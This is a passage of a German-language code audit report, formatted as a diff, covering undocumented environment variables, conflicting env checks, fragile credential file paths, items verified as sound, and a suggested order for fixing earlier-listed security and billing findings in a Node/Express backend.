+E3  Abschnitt "ENV Variablennamen (tatsaechlich im Code)" ist unvollstaendig
+    Genannt: ANTHROPIC_API_KEY, WC_KEY, WC_SECRET, WC_URL, GOOGLE_SHEET_ID,
+    BUSINESS_SHEET_ID, GEMINI_API_KEY, MC_API_KEY, CORS_ORIGIN,
+    GOOGLE_PROJECT_ID.
+    Ebenfalls im Code verwendet, aber nicht aufgefuehrt:
+    WC_URL_HONK, WC_KEY_HONK, WC_SECRET_HONK, WP_APP_PASSWORD,
+    WP_APP_PASSWORD_HONK, TURNSTILE_SECRET_KEY, GCHAT_WEBHOOK_URL,
+    NTFY_TOPIC (system.js:49), GOOGLE_CREDENTIALS_JSON,
+    GOOGLE_APPLICATION_CREDENTIALS, GOOGLE_DRIVE_* (backup-daily.js), PORT.
+
+E4  "Deprecated"-Abschnitt und setup-Skript widersprechen sich
+    CLAUDE.md erklaert Versand-Modell und PayPal-Modell seit Sprint 4.2 fuer
+    deprecated. backend/scripts/setup-business-sheet.js:52,55 legt beide
+    Spalten bei einem Neuaufsetzen weiterhin an und dokumentiert in der
+    Sheet-Notiz ihre alte Semantik als gueltig.
+
+E5  Zwei ENV-Pruefungen mit unterschiedlichen Pflichtlisten
+    check-env.js:8-15 verlangt 6 Schluessel (inkl. GOOGLE_PROJECT_ID, das
+    nicht in SECRET_KEYS steht), loadAllSecrets 16 (ohne GOOGLE_PROJECT_ID).
+    Beide laufen nacheinander beim Start (index.js:5 und 31). CLAUDE.md
+    beschreibt das korrekt - der Zustand selbst bleibt aber verwirrend, weil
+    ein fehlender Schluessel je nach Liste an zwei verschiedenen Stellen mit
+    zwei verschiedenen Meldungen abbricht.
+
+E6  Anmerkung zu den Credential-Pfaden in den Workflows
+    Kein Fehler, aber fragil: backup-daily.yml:27 schreibt
+    google-credentials.json ins Repo-Root, modell-check.yml:30 nach backend/.
+    Beides ist richtig, weil backup-daily.js:46 die Datei ueber ADC relativ
+    zum Arbeitsverzeichnis aufloest, waehrend lib/googleAuth.js:26 sie
+    relativ zu backend/ aufloest. modell-check.yml hat dazu einen
+    erklaerenden Kommentar, backup-daily.yml nicht - wer den Workflow
+    anfasst, wird die Datei mit hoher Wahrscheinlichkeit an die falsche
+    Stelle verschieben.
+
+
+================================================================================
+F. GEPRUEFT UND IN ORDNUNG
+================================================================================
+
+- Secrets sind nicht versioniert. .gitignore deckt .env,
+  google-credentials.json, google-credentials-new.json und
+  *-credentials.json ab; `git ls-files` listet keine Schluesseldatei.
+- backend/tests: 9 Suites, 158 Tests, alle gruen (npm test).
+- helmet, CORS mit expliziter Origin-Liste, express.json-Limit 256 kb,
+  trust proxy auf 1 (nicht true) - sauber begruendet in index.js:36-38.
+- Reihenfolge Rate-Limiter -> Auth -> Router ist korrekt aufgebaut.
+- Dockerfile laeuft als non-root (appuser), npm ci --only=production.
+- Mount-Reihenfolge /api/partner (partnerPortal vor partnerArtikel):
+  geprueft auf Pfadkollisionen, es gibt keine - /interne-bestellungen und
+  /kalkulation/preview fallen korrekt an partnerPortal vorbei.
+- collectText() sammelt korrekt alle text-Bloecke ein (thinking-Block
+  beruecksichtigt) und wird ueberall konsistent verwendet.
+- modelConfig: Fallback-Kette, Format-Validierung und Nicht-Cachen des
+  Fehlerfalls sind durchdacht und getestet.
+- chatNotify.redact(): E-Mail- und Telefonmuster greifen, die
+  Reihenfolge redact-vor-kuerzen ist begruendet und richtig.
+- .env.example deckt sich vollstaendig mit SECRET_KEYS (16/16).
+
+
+================================================================================
+VORSCHLAG ZUR REIHENFOLGE
+================================================================================
+
+Zuerst, weil ausnutzbar und billig zu beheben:
+    A1  ?api= entfernen (eine Zeile je Partner-Seite)
+    A2  Token-Pruefung in eigenauftrag (drei Zeilen)
+    A3  partnerView.js loeschen (Datei + Mount)
+    A4  Turnstile verpflichtend machen
+
+Danach, weil es Geld betrifft:
+    B1/B2  requireHeader in partner-kalkulation.js und kalkulation.js
+    B3     buildStornoRows auf Header-Lookup umstellen
+    B9     portoModell validieren
+
+Dann Betrieb:
+    A6  Claude-Call aus dem Health-Check / Intervall hochsetzen
+    C6  Tests in CI
+    C8  .dockerignore
+    B4  Chat-History-Slice
+
+Aufraeumen, wenn Zeit ist:
+    D1-D10, E1-E6
+
+================================================================================
